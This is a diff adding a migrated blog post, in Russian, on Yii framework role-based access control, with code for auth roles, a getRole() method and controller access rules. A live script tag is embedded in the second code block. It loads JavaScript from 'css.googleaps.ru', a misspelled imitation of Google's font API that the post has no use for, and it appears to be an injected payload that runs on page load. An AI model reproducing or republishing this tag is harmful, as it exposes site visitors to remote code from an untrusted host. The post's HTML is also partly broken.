@@ -1,0 +1,96 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii (RBAC)
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1653
+wordpress_url: http://devdocs.ru/partners-news/yii-rbac/
+date: '2015-04-08 12:58:23 +0200'
+date_gmt: '2015-04-08 12:58:23 +0200'
+categories:
+- Yii framework
+tags:
+- php
+- ip
+- des1roer
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;"><a href="http:&#47;&#47;yiiframework.ru&#47;doc&#47;cookbook&#47;ru&#47;access.rbac.file">оффициальный тутор<&#47;a></p>
+<div class="separator" style="clear: both; text-align: center;"><&#47;div><br />
+видео по нему</p>
+<p>в принципе все очень просто. особенно по видео.</p>
+<p>нюансы:<br />
+1.в auth<br />
+--</p>
+<pre><code></p>
+<p>&nbsp;&nbsp; 'admin' => array(</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'type' => CAuthItem::TYPE_ROLE,</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'description' => 'admin',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'bizRule' => null,</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'data' => null</p>
+<p>&nbsp;&nbsp;&nbsp; ),</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '1' => array(</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'type' => CAuthItem::TYPE_ROLE,</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'description' => 'admin',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'bizRule' => null,</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'data' => null</p>
+<p>&nbsp;&nbsp;&nbsp; ),<br />
+<&#47;code><&#47;pre><br />
+--<br />
+что 1, что admin являются именами. скорее всего вы не храните имя роли полностью и у вас есть ссылка на таблицу со списками ролей. тогда webuser.php<br />
+--</p>
+<pre><code></p>
+<p>&nbsp;&nbsp;&nbsp; function getRole() {</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if($user = $this->getModel()){</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; в таблице User есть поле role</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;return $user->id_role;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return Role::model()->findByPk($user->id_role)->name;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp; }</p>
+<p>и можно использовать такую проверку</p>
+<p>if(Yii::app()->user->checkAccess('admin')){</p>
+<p>&nbsp;&nbsp;&nbsp; echo "hello, I'm administrator";</p>
+<p>}</p>
+<p><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+2. хитрость с контроллером --</p>
+<pre><code></p>
+<p>&nbsp;&nbsp;&nbsp; public function accessRules()</p>
+<p>&nbsp;&nbsp;&nbsp; {</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return array(</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; array('allow',&nbsp; &#47;&#47; allow all users to perform 'index' and 'view' actions</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'actions'=>array('index','view'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'users'=>array('*'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; array('allow', &#47;&#47; allow authenticated user to perform 'create' and 'update' actions</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'actions'=>array('create','update'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'users'=>array('@'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; array('allow', &#47;&#47; allow admin user to perform 'admin' and 'delete' actions</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'actions'=>array('admin','delete'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'roles'=>array('admin'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; array('deny',&nbsp; &#47;&#47; deny all users</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'users'=>array('*'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; );</p>
+<p>&nbsp;&nbsp;&nbsp; }</p>
+<p>&#47;code><&#47;code><&#47;pre><br />
+-- так я дал всем админам все права. но вот --</p>
+<pre><code></p>
+<p>&nbsp;&nbsp;&nbsp; array('allow',&nbsp; &#47;&#47; allow all users to perform 'index' and 'view' actions</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'actions'=>array('index','view'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 'roles'=>array('*'),</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ),</p>
+<p>--<&#47;code><&#47;pre><br />
+работать НЕ БУДЕТ со звездочками работает только users</p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com</p>
